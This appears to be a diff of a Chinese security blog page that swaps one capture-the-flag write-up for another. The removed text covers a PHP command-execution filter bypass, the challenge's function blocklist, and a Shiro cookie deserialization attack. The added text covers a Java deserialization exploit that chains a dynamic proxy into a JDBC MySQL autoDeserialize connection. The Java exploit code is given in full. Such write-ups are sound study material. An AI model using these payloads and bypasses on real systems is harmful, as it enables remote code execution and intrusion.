@@ -9,7 +9,7 @@
     
     <title>
         
-            京麒CTF25-热身Web |
+            羊城杯2020-a_piece_of_java |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        京麒CTF25-热身Web
+                        羊城杯2020-a_piece_of_java
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-22 11:38:10</span>
+                <span class="datetime">2025-06-19 16:07:18</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Thu May 22 2025 11:38:50 GMT+0800">2025-05-22 11:38:50</span>
+                    <span class="datetime" data-updated="Thu Jun 19 2025 16:07:48 GMT+0800">2025-06-19 16:07:48</span>
                 </span>
             
         
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>814 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>574 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
             </span>
         
         
@@ -329,26 +329,18 @@
                     
 
                     
-                         <h1 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h1><p>考命令执行</p>
-<p>先看一下php版本，这里可以直接执行代码：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1747883847949-c208a500-98e9-47c9-a98c-9e9dc96d2ccd.png"  alt="img"></p>
-<p>是php7，那么我们知道，这里是支持这种函数执行方式的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+                         <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>动态代理触发实体类的危险方法+jdbc mysql反序列化</p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>先看一下Controller里面的代码：<img   src="/2025/05/03/JNI/020-a-piece-of-java/3e51c852d57964f1f30ae1c11601cad.png"  alt="img"></p>
+<p>整体的逻辑还是比较简单的，就是在index传入username和password，然后把这些数据封装到UserInfo对象，并存储到Cookie作为登录凭证。当我们访问hello的时候，Cookie中的数据会被deserialize，我们的username和pasword也就出来了。</p>
+<p>那么应该可以想到这么一些东西：deserialize的数据在cookie里，而cookie的数据我们可控，即我们可以操纵反序列化的数据</p>
+<p>上面的东西是题目的一环，不过条件还没用完，我们去看看其他文件，能够发现DatabaseInfo里面有数据库连接的行为：<img   src="/2025/05/03/JNI/020-a-piece-of-java/image.png"  alt="img"></p>
+<p>connect()里面的密码是直接拼接的，意味着我们可以在后面添加任意参数。然后这个checkAllInfo又调用了connect()。那怎么样才能触发这个checkAllInfo呢？这个就要用到我们的最后一个条件，动态代理。</p>
+<p>去看看这个动态代理：<img   src="/2025/05/03/JNI/020-a-piece-of-java/image.png"  alt="img"></p>
+<p>很明显，这个invoke里面是有checkAllInfo的，而且只要调用被动态代理类的方法，这个invoke就肯定会被调用。那整条链子就出来了，先直接看EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">DatabaseInfo</span> <span class="variable">databaseInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        databaseInfo.setPort(<span class="string">&quot;3309&quot;</span>);</span><br><span class="line">        databaseInfo.setPassword(<span class="string">&quot;123456&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        databaseInfo.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="type">InfoInvocationHandler</span> <span class="variable">infoInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseInfo);</span><br><span class="line">        Info info=(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(),databaseInfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serializeBytes(info);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="type">byte</span>[] serializeBytes(Object object) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>试了一下，直接成功了：<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110353.png"  alt="img"></p>
-<p>可以看一下题目的过滤逻辑：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$max_execution_time</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$memory_limit</span> = <span class="string">&#x27;128M&#x27;</span>;</span><br><span class="line"><span class="variable">$disabled_functions</span> = [</span><br><span class="line">    <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;curl_exec&#x27;</span>, <span class="string">&#x27;curl_multi_exec&#x27;</span>, <span class="string">&#x27;parse_ini_file&#x27;</span>, <span class="string">&#x27;show_source&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;posix_kill&#x27;</span>, <span class="string">&#x27;posix_mkfifo&#x27;</span>, <span class="string">&#x27;posix_setpgid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posix_setsid&#x27;</span>, <span class="string">&#x27;posix_setuid&#x27;</span>, <span class="string">&#x27;posix_setgid&#x27;</span>, <span class="string">&#x27;posix_uname&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;openlog&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;closelog&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="variable">$max_execution_time</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>, <span class="variable">$memory_limit</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;错误: 没有提供PHP代码&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$disabled_functions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\b&#x27;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$func</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&#x27;\s*\(/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;安全错误: 不允许使用 <span class="subst">&#123;$func&#125;</span>() 函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">    <span class="string">&#x27;/`.*`/&#x27;</span>,                          <span class="comment">// 反引号执行</span></span><br><span class="line">    <span class="string">&#x27;/eval\s*\(/i&#x27;</span>,                    <span class="comment">// eval函数</span></span><br><span class="line">    <span class="string">&#x27;/create_function\s*\(/i&#x27;</span>,         <span class="comment">// create_function</span></span><br><span class="line">    <span class="string">&#x27;/include\s*\(/i&#x27;</span>,                 <span class="comment">// include</span></span><br><span class="line">    <span class="string">&#x27;/require\s*\(/i&#x27;</span>,                 <span class="comment">// require</span></span><br><span class="line">    <span class="string">&#x27;/include_once\s*\(/i&#x27;</span>,            <span class="comment">// include_once</span></span><br><span class="line">    <span class="string">&#x27;/require_once\s*\(/i&#x27;</span>,            <span class="comment">// require_once</span></span><br><span class="line">    <span class="string">&#x27;/file_put_contents\s*\(/i&#x27;</span>,       <span class="comment">// 文件写入</span></span><br><span class="line">    <span class="string">&#x27;/file_get_contents\s*\(/i&#x27;</span>,       <span class="comment">// 文件读取</span></span><br><span class="line">    <span class="string">&#x27;/unlink\s*\(/i&#x27;</span>,                  <span class="comment">// 文件删除</span></span><br><span class="line">    <span class="string">&#x27;/phpinfo\s*\(/i&#x27;</span>,                 <span class="comment">// phpinfo</span></span><br><span class="line">    <span class="string">&#x27;/chmod\s*\(/i&#x27;</span>,                   <span class="comment">// 修改权限</span></span><br><span class="line">    <span class="string">&#x27;/chown\s*\(/i&#x27;</span>,                   <span class="comment">// 修改所有者</span></span><br><span class="line">    <span class="string">&#x27;/chgrp\s*\(/i&#x27;</span>,                   <span class="comment">// 修改组</span></span><br><span class="line">    <span class="string">&#x27;/putenv\s*\(/i&#x27;</span>,                  <span class="comment">// 环境变量</span></span><br><span class="line">    <span class="string">&#x27;/ini_set\s*\(/i&#x27;</span>,                 <span class="comment">// 修改INI设置</span></span><br><span class="line">    <span class="string">&#x27;/extract\s*\(/i&#x27;</span>,                 <span class="comment">// extract</span></span><br><span class="line">    <span class="string">&#x27;/parse_str\s*\(/i&#x27;</span>,               <span class="comment">// parse_str</span></span><br><span class="line">    <span class="string">&#x27;/assert\s*\(/i&#x27;</span>,                  <span class="comment">// assert</span></span><br><span class="line">    <span class="string">&#x27;/preg_replace\s*\(.*\/e.*\)/i&#x27;</span>,   <span class="comment">// preg_replace /e修饰符</span></span><br><span class="line">    <span class="string">&#x27;/proc_terminate\s*\(/i&#x27;</span>,          <span class="comment">// 进程终止</span></span><br><span class="line">    <span class="string">&#x27;/pcntl_fork\s*\(/i&#x27;</span>,              <span class="comment">// 进程控制</span></span><br><span class="line">    <span class="string">&#x27;/posix_getpwuid\s*\(/i&#x27;</span>,          <span class="comment">// 获取用户信息</span></span><br><span class="line">    <span class="string">&#x27;/posix_kill\s*\(/i&#x27;</span>,              <span class="comment">// 发送信号</span></span><br><span class="line">    <span class="string">&#x27;/posix_setuid\s*\(/i&#x27;</span>,            <span class="comment">// 设置UID</span></span><br><span class="line">    <span class="string">&#x27;/posix_setgid\s*\(/i&#x27;</span>             <span class="comment">// 设置GID</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;安全错误: 检测到潜在的危险操作&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$old_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$old_display_errors</span> = <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">ParseError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;解析错误: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;位于行: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getLine</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;运行时错误: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;位于行: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getLine</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="variable">$old_error_reporting</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="variable">$old_display_errors</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sensitive_patterns</span> = [</span><br><span class="line">    <span class="string">&#x27;/\/home\/.*/i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/\/var\/www\/.*/i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/\[internal function\]/i&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="string">&#x27;[隐藏信息]&#x27;</span>, <span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$output</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>大概就是通过 ‘system(‘这样的匹配规则来过滤。最底下还会对输出中的敏感目录进行过滤。</p>
-<h1 id="Ezlogin"><a href="#Ezlogin" class="headerlink" title="Ezlogin"></a>Ezlogin</h1><p>可以通过插件或者cookie来判断是一道Java。<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image.png"  alt="img"></p>
-<p>扫一下目录，发现有&#x2F;actuator泄露。简单看一下mapping，env，能发现是一个8u111的环境。</p>
-<p>然后开始用heapdump，先getfile看一下依赖：<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110424.png"  alt="img"></p>
-<p>可以看到有shiro和cc3.2.1，下面还有一个cb1.9.4</p>
-<p>查一下shirokey，上面图片最顶上其实已经查了。</p>
-<p>那接下来用java-chain工具一把梭就行。<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110342.png"  alt="img"></p>
-<p>记得把GCM模式打开。</p>
-<p>带上cookie，发包即可。不过这里好像对header长度有限制，我生成内存马直接报错了。</p>
-<p>Cookie: rememberMe&#x3D; 6ZAFnvTDGFQNmw2R2x4S8+bF。。。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目比较简单，但是题目的环境都挺好的，看着很舒服。</p>
+<p>我这里正向整理一遍：deserialize后得到我们设置的DatabaseInfo的动态代理，赋值给info；info.getAllInfo()触发动态代理里面的invoke()；invoke里面的checkAllInfo()触发DatabaseInfo里面的connect()。从而触发漏洞。</p>
+<p>接下来只要用python在3309端口开一个fake mysql的服务，然后返回恶意的序列化数据就可以了，就是之前学的mysql jdbc反序列化里面的内容。</p>
 
                     
                 </div>
@@ -359,11 +351,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                京麒CTF25-热身Web
+                羊城杯2020-a_piece_of_java
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/22/京麒CTF25-热身Web/
+                2025/06/19/羊城杯2020-a-piece-of-java/
             </div>
         </div>
 
@@ -379,7 +371,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-22 11:38</div>
+                <div class="content">2025-06-19 16:07</div>
             </div>
 
 
@@ -431,31 +423,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/06/01/D3CTF-d3jtar/"
-                                   title="D3CTF-d3jtar"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">D3CTF-d3jtar</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/09/MRCTF22-Springcoffee/"
-                                   title="MRCTF22 Springcoffee"
+                                   href="/2025/06/03/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/"
+                                   title="编码方式学习"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">MRCTF22 Springcoffee</span>
+                                        <span class="post-nav-title-item text-ellipsis">编码方式学习</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -483,7 +459,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Execute"><span class="nav-number">1.</span> <span class="nav-text">Execute</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ezlogin"><span class="nav-number">2.</span> <span class="nav-text">Ezlogin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a></li></ol>
     </div>
 </div>
 
@@ -673,7 +649,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Execute"><span class="nav-number">1.</span> <span class="nav-text">Execute</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ezlogin"><span class="nav-number">2.</span> <span class="nav-text">Ezlogin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a></li></ol>
     </div>
 </div>
 
